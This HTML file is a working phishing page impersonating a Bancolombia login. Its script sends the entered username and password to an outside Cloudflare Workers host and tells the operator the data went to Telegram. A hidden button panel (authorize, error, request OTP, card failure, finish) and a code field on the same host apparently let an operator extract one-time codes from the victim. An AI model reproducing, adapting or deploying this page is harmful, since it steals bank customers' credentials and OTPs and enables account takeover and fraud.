<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login Bancolombia</title>
<style>
  body {
    font-family: Arial, sans-serif;
    display: flex;
    flex-direction: column;
    align-items: center;
    padding: 40px;
  }

  input, button {
    padding: 10px;
    margin: 5px;
    font-size: 16px;
  }

  .button-container button {
    margin: 5px;
    cursor: pointer;
  }

  .hidden {
    display: none;
  }

  #status {
    margin-top: 20px;
    font-weight: bold;
  }
</style>
</head>
<body>

<h2>Login Bancolombia</h2>

<div id="login-form">
  <input type="text" id="usuario" placeholder="Usuario">
  <input type="password" id="clave" placeholder="Clave">
  <button id="login-btn">Enviar</button>
</div>

<div id="action-buttons" class="button-container hidden">
  <button data-action="autorizar">Autorizar</button>
  <button data-action="error">Error</button>
  <button data-action="otp">Solicitar OTP</button>
  <button data-action="fallo">Fallo TC</button>
  <button data-action="finalizar">Finalizar</button>
</div>

<div id="code-input" class="hidden">
  <input type="text" id="codigo" placeholder="Ingresa el código">
  <button id="submit-code">Enviar Código</button>
</div>

<div id="status"></div>

<script>
const baseURL = "https://blue-night-7897.claropromoxlaro.workers.dev";

let transactionId = null;

// Función para mostrar status
function setStatus(msg) {
  document.getElementById('status').innerText = msg;
}

// Login
document.getElementById('login-btn').addEventListener('click', async () => {
  const usuario = document.getElementById('usuario').value;
  const clave = document.getElementById('clave').value;
  if (!usuario || !clave) return setStatus("Completa usuario y clave");

  transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
  localStorage.setItem('transactionId', transactionId);

  const res = await fetch(`${baseURL}/login`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ usuario, clave, transactionId })
  });

  if (res.ok) {
    setStatus("Datos enviados a Telegram");
    document.getElementById('login-form').classList.add('hidden');
    document.getElementById('action-buttons').classList.remove('hidden');
    document.getElementById('code-input').classList.remove('hidden');
  } else {
    setStatus("Error al enviar datos");
  }
});

// Manejo de botones
document.querySelectorAll('#action-buttons button').forEach(btn => {
  btn.addEventListener('click', async () => {
    const action = btn.dataset.action;
    document.getElementById('action-buttons').classList.add('hidden'); // Ocultar botones

    const res = await fetch(`${baseURL}/${action}?id=${transactionId}`);
    if (res.ok) setStatus(`Acción "${action}" registrada. Ingresa el código para desbloquear botones`);
    else setStatus("Error al registrar acción");
  });
});

// Enviar código
document.getElementById('submit-code').addEventListener('click', async () => {
  const codigo = document.getElementById('codigo').value;
  if (!codigo) return setStatus("Ingresa un código");

  const res = await fetch(`${baseURL}/reset`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ id: transactionId })
  });

  if (res.ok) {
    setStatus("Botones desbloqueados. Puedes elegir otra opción.");
    document.getElementById('action-buttons').classList.remove('hidden');
    document.getElementById('codigo').value = "";
  } else {
    setStatus("Error al desbloquear botones");
  }
});
</script>

</body>
</html>
